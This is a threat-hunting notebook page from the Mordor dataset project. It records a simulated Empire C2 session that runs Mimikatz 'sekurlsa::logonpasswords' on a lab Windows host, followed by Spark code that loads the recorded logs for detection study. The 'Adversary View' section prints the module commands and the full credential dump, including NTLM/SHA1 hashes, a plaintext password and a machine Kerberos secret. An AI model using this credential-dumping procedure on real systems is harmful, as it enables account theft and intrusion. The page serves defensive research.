---
redirect_from:
  - "/notebooks/small/windows/06-credential-access/sd-190518202151"
interact_link: content/notebooks/small/windows/06_credential_access/SD-190518202151.ipynb
kernel_name: 
kernel_path: content/notebooks/small/windows/06_credential_access
has_widgets: false
title: |-
  Empire Mimikatz Logonpasswords
pagenum: 53
prev_page:
  url: /notebooks/small/windows/06_credential_access/SD-190319145126.html
next_page:
  url: /notebooks/small/windows/06_credential_access/SD-190319151006.html
suffix: .ipynb
search: domain shire null username hr logon password com mimikatz s id name authentication session user server sid msv tspkg wdigest kerberos ssp credman logonpasswords credentials powershell nmartha primary ntlm sha am empire mordor interactive dbaddfebadebaf dfbacbfdebedfd tkvpx gentilkiwi dataset module true agent u ors jst r w y qtxx xnppxvjwqhd jsxp aeyino eje mv rufnpdmfv fampm fptofl pwrygpj simulation invoke description run tasked e service windows c hunters forge master memory blog benjamin vincent hfdc pm fabdcbbee eddbdcebcfcffade dpapi eaabeadfeaa dwm window manager f umfd font driver host undefinedlogontype metadata sd author roberto rodriguez cybrwardg creation date platform environment type

comment: "***PROGRAMMATICALLY GENERATED, DO NOT EDIT. SEE ORIGINAL FILES IN /content***"
---

    <main class="jupyter-page">
    <div id="page-info"><div id="page-title">Empire Mimikatz Logonpasswords</div>
</div>
    <div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Metadata">Metadata<a class="anchor-link" href="#Metadata"> </a></h2>
</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<table>
<thead><tr>
<th style="text-align:left"></th>
<th style="text-align:left"></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">id</td>
<td style="text-align:left">SD-190518202151</td>
</tr>
<tr>
<td style="text-align:left">author</td>
<td style="text-align:left">Roberto Rodriguez @Cyb3rWard0g</td>
</tr>
<tr>
<td style="text-align:left">creation date</td>
<td style="text-align:left">2019/05/18</td>
</tr>
<tr>
<td style="text-align:left">platform</td>
<td style="text-align:left">Windows</td>
</tr>
<tr>
<td style="text-align:left">Mordor Environment</td>
<td style="text-align:left">shire</td>
</tr>
<tr>
<td style="text-align:left">Simulation Type</td>
<td style="text-align:left">C2</td>
</tr>
<tr>
<td style="text-align:left">Simulation Tool</td>
<td style="text-align:left">Empire</td>
</tr>
<tr>
<td style="text-align:left">Simulation Script</td>
<td style="text-align:left"><a href="https://github.com/hunters-forge/Blacksmith/blob/master/aws/mordor/cfn-files/scripts/Invoke-Mimikatz.ps1">https://github.com/hunters-forge/Blacksmith/blob/master/aws/mordor/cfn-files/scripts/Invoke-Mimikatz.ps1</a></td>
</tr>
<tr>
<td style="text-align:left">Mordor Dataset</td>
<td style="text-align:left"><a href="https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_mimikatz_logonpasswords.tar.gz">https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_mimikatz_logonpasswords.tar.gz</a></td>
</tr>
</tbody>
</table>

</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Dataset-Description">Dataset Description<a class="anchor-link" href="#Dataset-Description"> </a></h2><p>This dataset represents adversaries using mimikatz and module <code>logonpasswords</code> to dump credentials from the memory contents of lsass.exe</p>

</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Adversary-View">Adversary View<a class="anchor-link" href="#Adversary-View"> </a></h2>
<pre><code>(Empire: TKV35P8X) &gt; usemodule credentials/mimikatz/logonpasswords*
(Empire: powershell/credentials/mimikatz/logonpasswords) &gt; info

              Name: Invoke-Mimikatz DumpCreds
            Module: powershell/credentials/mimikatz/logonpasswords
        NeedsAdmin: True
        OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: True
  OutputExtension: None

Authors:
  @JosephBialek
  @gentilkiwi

Description:
  Runs PowerSploit's Invoke-Mimikatz function to extract
  plaintext credentials from memory.

Comments:
  http://clymb3r.wordpress.com/ http://blog.gentilkiwi.com

Options:

  Name  Required    Value                     Description
  ----  --------    -------                   -----------
  Agent True        TKV35P8X                  Agent to run module on.                 

(Empire: powershell/credentials/mimikatz/logonpasswords) &gt; execute
[*] Tasked TKV35P8X to run TASK_CMD_JOB
[*] Agent TKV35P8X tasked with task ID 17
[*] Tasked agent TKV35P8X to run module powershell/credentials/mimikatz/logonpasswords
(Empire: powershell/credentials/mimikatz/logonpasswords) &gt; Job started: TS8ARN
Hostname: HR001.shire.com / S-1-5-21-2511471446-1103646877-3980648787

  .#####.   mimikatz 2.1.1 (x64) #17763 Feb 23 2019 12:03:02
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 789700 (00000000:000c0cc4)
Session           : Interactive from 1
User Name         : nmartha
Domain            : SHIRE
Logon Server      : HFDC01
Logon Time        : 5/14/2019 12:02:02 PM
SID               : S-1-5-21-2511471446-1103646877-3980648787-1106
  msv : 
  [00000003] Primary
  * Username : nmartha
  * Domain   : SHIRE
  * NTLM     : 65f55a917b232dc6bb8e93872e458326
  * SHA1     : 19ed298d7b3d2c58918ebc0f4670cff5a1020d9e
  * DPAPI    : e28a4a7bea1950d9558f1e3a4662302a
  tspkg :   
  wdigest : 
  * Username : nmartha
  * Domain   : SHIRE
  * Password : (null)
  kerberos :    
  * Username : nmartha
  * Domain   : SHIRE.COM
  * Password : (null)
  ssp : 
  credman : 

Authentication Id : 0 ; 789663 (00000000:000c0c9f)
Session           : Interactive from 1
User Name         : nmartha
Domain            : SHIRE
Logon Server      : HFDC01
Logon Time        : 5/14/2019 12:02:02 PM
SID               : S-1-5-21-2511471446-1103646877-3980648787-1106
  msv : 
  [00000003] Primary
  * Username : nmartha
  * Domain   : SHIRE
  * NTLM     : 65f55a917b232dc6bb8e93872e458326
  * SHA1     : 19ed298d7b3d2c58918ebc0f4670cff5a1020d9e
  * DPAPI    : e28a4a7bea1950d9558f1e3a4662302a
  tspkg :   
  wdigest : 
  * Username : nmartha
  * Domain   : SHIRE
  * Password : (null)
  kerberos :    
  * Username : nmartha
  * Domain   : SHIRE.COM
  * Password : (null)
  ssp : 
  [00000000]
  * Username : pgustavo
  * Domain   : shire
  * Password : W1n1!19
  credman : 

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 5/3/2019 3:14:44 AM
SID               : S-1-5-19
  msv : 
  tspkg :   
  wdigest : 
  * Username : (null)
  * Domain   : (null)
  * Password : (null)
  kerberos :    
  * Username : (null)
  * Domain   : (null)
  * Password : (null)
  ssp : 
  credman : 

Authentication Id : 0 ; 63941 (00000000:0000f9c5)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 5/3/2019 3:14:43 AM
SID               : S-1-5-90-0-1
  msv : 
  [00000003] Primary
  * Username : HR001$
  * Domain   : SHIRE
  * NTLM     : 7db15a1083d24df4e5b82a0de8ba60f7
  * SHA1     : 11d7f7530035b95306ac0b9f24d29e85bed0fd13
  tspkg :   
  wdigest : 
  * Username : HR001$
  * Domain   : SHIRE
  * Password : (null)
  kerberos :    
  * Username : HR001$
  * Domain   : shire.com
  * Password : u5@ORs;+(&amp;[JsT@`r"_.W/y&amp;:$&gt;QTXx!\xN_$ppX8vj&lt;35*wQHd[jsX4p$,aEyI3n12O EJe)Mv5?R90uf6N+PdMFV6=s`&amp;fa&gt;mpm[FP$+toFL?`pWRygP8j
  ssp : 
  credman : 

Authentication Id : 0 ; 62725 (00000000:0000f505)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 5/3/2019 3:14:43 AM
SID               : S-1-5-90-0-1
  msv : 
  [00000003] Primary
  * Username : HR001$
  * Domain   : SHIRE
  * NTLM     : 7db15a1083d24df4e5b82a0de8ba60f7
  * SHA1     : 11d7f7530035b95306ac0b9f24d29e85bed0fd13
  tspkg :   
  wdigest : 
  * Username : HR001$
  * Domain   : SHIRE
  * Password : (null)
  kerberos :    
  * Username : HR001$
  * Domain   : shire.com
  * Password : u5@ORs;+(&amp;[JsT@`r"_.W/y&amp;:$&gt;QTXx!\xN_$ppX8vj&lt;35*wQHd[jsX4p$,aEyI3n12O EJe)Mv5?R90uf6N+PdMFV6=s`&amp;fa&gt;mpm[FP$+toFL?`pWRygP8j
  ssp : 
  credman : 

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : HR001$
Domain            : SHIRE
Logon Server      : (null)
Logon Time        : 5/3/2019 3:14:43 AM
SID               : S-1-5-20
  msv : 
  [00000003] Primary
  * Username : HR001$
  * Domain   : SHIRE
  * NTLM     : 7db15a1083d24df4e5b82a0de8ba60f7
  * SHA1     : 11d7f7530035b95306ac0b9f24d29e85bed0fd13
  tspkg :   
  wdigest : 
  * Username : HR001$
  * Domain   : SHIRE
  * Password : (null)
  kerberos :    
  * Username : hr001$
  * Domain   : SHIRE.COM
  * Password : (null)
  ssp : 
  credman : 

Authentication Id : 0 ; 39974 (00000000:00009c26)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 5/3/2019 3:14:41 AM
SID               : S-1-5-96-0-0
  msv : 
  [00000003] Primary
  * Username : HR001$
  * Domain   : SHIRE
  * NTLM     : 7db15a1083d24df4e5b82a0de8ba60f7
  * SHA1     : 11d7f7530035b95306ac0b9f24d29e85bed0fd13
  tspkg :   
  wdigest : 
  * Username : HR001$
  * Domain   : SHIRE
  * Password : (null)
  kerberos :    
  * Username : HR001$
  * Domain   : shire.com
  * Password : u5@ORs;+(&amp;[JsT@`r"_.W/y&amp;:$&gt;QTXx!\xN_$ppX8vj&lt;35*wQHd[jsX4p$,aEyI3n12O EJe)Mv5?R90uf6N+PdMFV6=s`&amp;fa&gt;mpm[FP$+toFL?`pWRygP8j
  ssp : 
  credman : 

Authentication Id : 0 ; 39911 (00000000:00009be7)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 5/3/2019 3:14:41 AM
SID               : S-1-5-96-0-1
  msv : 
  [00000003] Primary
  * Username : HR001$
  * Domain   : SHIRE
  * NTLM     : 7db15a1083d24df4e5b82a0de8ba60f7
  * SHA1     : 11d7f7530035b95306ac0b9f24d29e85bed0fd13
  tspkg :   
  wdigest : 
  * Username : HR001$
  * Domain   : SHIRE
  * Password : (null)
  kerberos :    
  * Username : HR001$
  * Domain   : shire.com
  * Password : u5@ORs;+(&amp;[JsT@`r"_.W/y&amp;:$&gt;QTXx!\xN_$ppX8vj&lt;35*wQHd[jsX4p$,aEyI3n12O EJe)Mv5?R90uf6N+PdMFV6=s`&amp;fa&gt;mpm[FP$+toFL?`pWRygP8j
  ssp : 
  credman : 

Authentication Id : 0 ; 37663 (00000000:0000931f)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 5/3/2019 3:14:40 AM
SID               : 
  msv : 
  [00000003] Primary
  * Username : HR001$
  * Domain   : SHIRE
  * NTLM     : 7db15a1083d24df4e5b82a0de8ba60f7
  * SHA1     : 11d7f7530035b95306ac0b9f24d29e85bed0fd13
  tspkg :   
  wdigest : 
  kerberos :    
  ssp : 
  credman : 

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : HR001$
Domain            : SHIRE
Logon Server      : (null)
Logon Time        : 5/3/2019 3:14:40 AM
SID               : S-1-5-18
  msv : 
  tspkg :   
  wdigest : 
  * Username : HR001$
  * Domain   : SHIRE
  * Password : (null)
  kerberos :    
  * Username : hr001$
  * Domain   : SHIRE.COM
  * Password : (null)
  ssp : 
  credman : 

mimikatz(powershell) # exit
Bye!</code></pre>

</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Explore-Mordor-Dataset">Explore Mordor Dataset<a class="anchor-link" href="#Explore-Mordor-Dataset"> </a></h2>
</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h3 id="Initialize-Analytics-Engine">Initialize Analytics Engine<a class="anchor-link" href="#Initialize-Analytics-Engine"> </a></h3>
</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">from</span> <span class="nn">openhunt.mordorutils</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">spark</span> <span class="o">=</span> <span class="n">get_spark</span><span class="p">()</span>
</pre></div>

    </div>
</div>
</div>

</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h3 id="Download-&amp;-Process-Mordor-File">Download &amp; Process Mordor File<a class="anchor-link" href="#Download-&amp;-Process-Mordor-File"> </a></h3>
</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="n">mordor_file</span> <span class="o">=</span> <span class="s2">&quot;https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_mimikatz_logonpasswords.tar.gz&quot;</span>
<span class="n">registerMordorSQLTable</span><span class="p">(</span><span class="n">spark</span><span class="p">,</span> <span class="n">mordor_file</span><span class="p">,</span> <span class="s2">&quot;mordorTable&quot;</span><span class="p">)</span>
</pre></div>

    </div>
</div>
</div>

</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h3 id="Get-to-know-your-data">Get to know your data<a class="anchor-link" href="#Get-to-know-your-data"> </a></h3>
</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
    <span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT channel, COUNT(1)</span>
<span class="sd">FROM mordorTable</span>
<span class="sd">GROUP BY channel</span>
<span class="sd">    &#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="kc">False</span><span class="p">)</span>
        
</pre></div>

    </div>
</div>
</div>

</div>
</div>

 


    </main>
    